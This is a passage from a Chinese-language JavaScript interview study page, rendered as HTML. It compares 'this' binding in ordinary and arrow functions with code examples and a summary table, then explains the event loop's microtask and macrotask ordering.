</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_7-this-指向"><a href="#_7-this-指向" class="header-anchor">#</a> 7. this 指向</h2> <h4 id="普通函数与箭头函数的-this-相关对比"><a href="#普通函数与箭头函数的-this-相关对比" class="header-anchor">#</a> 普通函数与箭头函数的 this 相关对比</h4> <ul><li>普通函数：this指向函数运行时所在的对象，<strong>也就是说谁调用就指向谁</strong>，没有被对象调用的函数默认指向window</li> <li>箭头函数：<strong>没有 this</strong>，它会从自己的作用域链的上一层继承 this，指向<strong>定义时所在的对象</strong></li></ul> <table><thead><tr><th style="text-align:center;">特性</th> <th style="text-align:center;">普通函数</th> <th style="text-align:center;">箭头函数</th></tr></thead> <tbody><tr><td style="text-align:center;">​​this 绑定时机​</td> <td style="text-align:center;">运行时动态绑定</td> <td style="text-align:center;">定义时静态绑定</td></tr> <tr><td style="text-align:center;">​​​this 指向​​</td> <td style="text-align:center;">由调用方式决定</td> <td style="text-align:center;">继承外层作用域的 this</td></tr> <tr><td style="text-align:center;">​​能否改变 this​​</td> <td style="text-align:center;">可通过 call/apply/bind 改变</td> <td style="text-align:center;">不可改变</td></tr> <tr><td style="text-align:center;">​​arguments 对象​</td> <td style="text-align:center;">有</td> <td style="text-align:center;">无</td></tr> <tr><td style="text-align:center;">​​构造函数​​</td> <td style="text-align:center;">可作为构造函数</td> <td style="text-align:center;">不能作为构造函数</td></tr> <tr><td style="text-align:center;">​​prototype（显式原型）​</td> <td style="text-align:center;">有</td> <td style="text-align:center;">无</td></tr></tbody></table> <h3 id="_1-默认绑定-独立函数调用"><a href="#_1-默认绑定-独立函数调用" class="header-anchor">#</a> 1. 默认绑定（独立函数调用）</h3> <p>普通函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">normalFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'普通函数 this:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 指向全局对象</span>
<span class="token punctuation">}</span>

<span class="token function">normalFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// 浏览器中输出: Window {...} (非严格模式)</span>
<span class="token comment">// 严格模式输出: undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>箭头函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">arrowFunc</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'箭头函数 this:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 继承定义时的 this</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function">arrowFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// 输出取决于定义时的上下文</span>
<span class="token comment">// 如果定义在全局，输出: Window {...}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="_2-隐式绑定-方法调用"><a href="#_2-隐式绑定-方法调用" class="header-anchor">#</a> 2. 隐式绑定（方法调用）</h3> <p>普通函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span>
  <span class="token function-variable function">normalMethod</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'普通方法 this:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 指向调用对象</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

obj<span class="token punctuation">.</span><span class="token function">normalMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 情况1：作为对象方法调用</span>
<span class="token comment">// 输出: {name: &quot;Alice&quot;, normalMethod: ƒ}</span>
<span class="token keyword">const</span> greet <span class="token operator">=</span> obj<span class="token punctuation">.</span>normalMethod<span class="token punctuation">;</span>
<span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 情况2：赋值给变量后直接调用</span>
<span class="token comment">// 输出: Window {...} 函数赋值导致 this 丢失</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>箭头函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span>
  <span class="token function-variable function">arrowMethod</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'箭头方法 this:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 继承定义时的 this</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

obj<span class="token punctuation">.</span><span class="token function">arrowMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// 输出: Window {...} (因为定义在全局)</span>
<span class="token keyword">const</span> greet2 <span class="token operator">=</span> obj<span class="token punctuation">.</span>arrowMethod<span class="token punctuation">;</span>
<span class="token function">greet2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 输出: Window {...} (因为定义在全局)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="_3-显式绑定-call-apply-bind"><a href="#_3-显式绑定-call-apply-bind" class="header-anchor">#</a> 3. 显式绑定（call/apply/bind）</h3> <p>普通函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">normalGreet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">普通函数 this.name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> person <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Bob'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function">normalGreet</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// 输出: &quot;普通函数 this.name: Bob&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>箭头函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">arrowGreet</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">箭头函数 this.name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> person <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Bob'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function">arrowGreet</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// 输出: &quot;箭头函数 this.name: undefined&quot; (无法改变箭头函数的 this)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="_4-构造函数调用"><a href="#_4-构造函数调用" class="header-anchor">#</a> 4. 构造函数调用</h3> <p>普通函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">NormalPerson</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'构造函数 this:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> alice <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NormalPerson</span><span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 输出: NormalPerson {name: &quot;Alice&quot;}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>箭头函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">ArrowPerson</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span> <span class="token comment">// 报错</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> bob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrowPerson</span><span class="token punctuation">(</span><span class="token string">'Bob'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// TypeError: ArrowPerson is not a constructor</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="_5-回调函数中的表现"><a href="#_5-回调函数中的表现" class="header-anchor">#</a> 5. 回调函数中的表现</h3> <p>普通函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Charlie'</span><span class="token punctuation">,</span>
  <span class="token function-variable function">start</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'普通回调 this:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 指向全局</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

obj<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 输出: Window {...} 回调函数默认绑定到全局</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>箭头函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Charlie'</span><span class="token punctuation">,</span>
  <span class="token function-variable function">start</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'箭头回调 this:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 继承 start 的 this</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

obj<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 输出: {name: &quot;Charlie&quot;, start: ƒ}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="_6-类方法中的表现"><a href="#_6-类方法中的表现" class="header-anchor">#</a> 6. 类方法中的表现</h3> <p>普通函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">NormalClass</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">42</span> <span class="token punctuation">}</span>
  
  <span class="token function">showValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'普通类方法 this.value:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NormalClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
instance<span class="token punctuation">.</span><span class="token function">showValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: &quot;普通类方法 this.value: 42&quot;</span>

<span class="token keyword">const</span> <span class="token punctuation">{</span> showValue <span class="token punctuation">}</span> <span class="token operator">=</span> instance<span class="token punctuation">;</span>
<span class="token function">showValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 报错: Cannot read property 'value' of undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>箭头函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">ArrowClass</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">42</span> <span class="token punctuation">}</span>
  
  <span class="token function-variable function">showValue</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'箭头类方法 this.value:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> arrowInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrowClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
arrowInstance<span class="token punctuation">.</span><span class="token function">showValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: &quot;箭头类方法 this.value: 42&quot;</span>

<span class="token keyword">const</span> <span class="token punctuation">{</span> showValue <span class="token punctuation">}</span> <span class="token operator">=</span> arrowInstance<span class="token punctuation">;</span>
<span class="token function">showValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 仍然输出: &quot;箭头类方法 this.value: 42&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="_7-关键区别总结表"><a href="#_7-关键区别总结表" class="header-anchor">#</a> 7. 关键区别总结表</h3> <table><thead><tr><th style="text-align:center;">场景</th> <th style="text-align:center;">普通函数中的 <code>this</code></th> <th style="text-align:center;">箭头函数中的 <code>this</code></th></tr></thead> <tbody><tr><td style="text-align:center;">独立调用</td> <td style="text-align:center;">全局对象/<code>undefined</code></td> <td style="text-align:center;">继承定义时的 <code>this</code></td></tr> <tr><td style="text-align:center;">对象方法</td> <td style="text-align:center;">调用该方法的对象</td> <td style="text-align:center;">继承定义时的 <code>this</code></td></tr> <tr><td style="text-align:center;">call/apply/bind</td> <td style="text-align:center;">可改变 this 指向</td> <td style="text-align:center;">不可改变 <code>this</code> 指向</td></tr> <tr><td style="text-align:center;">构造函数</td> <td style="text-align:center;">指向新创建的实例</td> <td style="text-align:center;">不能作为构造函数</td></tr> <tr><td style="text-align:center;">回调函数</td> <td style="text-align:center;">通常指向全局或 <code>undefined</code></td> <td style="text-align:center;">继承外层函数的 this</td></tr> <tr><td style="text-align:center;">类方法</td> <td style="text-align:center;">指向实例（但可能丢失绑定）</td> <td style="text-align:center;">始终绑定到实例</td></tr></tbody></table> <h3 id="_8-react-类组件中为什么要-bind-this"><a href="#_8-react-类组件中为什么要-bind-this" class="header-anchor">#</a> 8. React 类组件中为什么要 bind this？</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">MyComponent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>handleClick <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  
  <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 确保指向组件实例</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><strong>事件处理函数作为回调传递时会丢失 <code>this</code> 绑定</strong></p> <h3 id="实际应用建议"><a href="#实际应用建议" class="header-anchor">#</a> 实际应用建议</h3> <ul><li><ol><li>​​使用普通函数​​：</li></ol> <ul><li>需要动态 <code>this</code> 的场景（如对象方法）</li> <li>需要作为构造函数使用的函数</li></ul></li> <li><ol start="2"><li>​使用箭头函数​​：</li></ol> <ul><li>需要保持 <code>this</code> 不变的场景（如回调函数）</li> <li>类中需要自动绑定实例的方法</li> <li>需要继承外层 <code>this</code> 的函数</li></ul></li> <li><ol start="3"><li>​避免混用陷阱​​：</li></ol></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Dave'</span><span class="token punctuation">,</span>
  <span class="token comment">// ❌ 错误：箭头函数作为对象方法</span>
  <span class="token function-variable function">badMethod</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// undefined</span>
  
  <span class="token comment">// ✅ 正确：普通函数作为方法</span>
  <span class="token function-variable function">goodMethod</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ✅ 正确：箭头函数嵌套使用</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;Dave&quot;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="_8-事件执行机制"><a href="#_8-事件执行机制" class="header-anchor">#</a> 8. 事件执行机制</h2> <ul><li><p>javascript 是一门单线程语言<br>
JS 在执行的过程中会产生执行环境，这些执行环境会被按照顺序的加入到执行栈中<br>
同步和异步任务分别进入不同的执行&quot;场所&quot;，同步的进入主线程，异步的代码，会被挂起并加入到 Task（有多种 task） 队列中</p></li> <li><p>除了广义的同步任务和异步任务，还包括有更加精确的微任务和宏任务<br> <strong>微任务</strong>包括 process.nextTick，promise，Object.observe，MutationObserver<br> <strong>宏任务</strong>包括 script，setTimeout，setInterval，setImmediate，I/O，UI rendering</p></li> <li><p>为什么需要微任务：是为了给紧急任务一个插队的机会</p></li></ul> <p>当前宏任务中的 JavaScript 快执行完成时，也就在 JavaScript 引擎准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。</p> <p><strong>所以正确的一次 Event loop 顺序是这样的</strong></p> <p>1.执行全局同步代码</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'同步代码开始'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>2.处理微任务队列</p> <ul><li>Promise 回调</li> <li>MutationObserver 回调</li> <li>process.nextTick(Node.js)</li></ul> <p>3.渲染更新（如果需要）</p> <ul><li>执行 requestAnimationFrame 回调</li> <li>计算样式和布局</li> <li>实际绘制到屏幕</li></ul> <p>4.处理宏任务队列</p> <ul><li>setTimeout/setInterval</li> <li>I/O 操作回调</li> <li>UI 交互事件（点击、滚动等）</li> <li>postMessage</li></ul> <p>5.重复循环​</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
 
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">)</span>
    <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
 
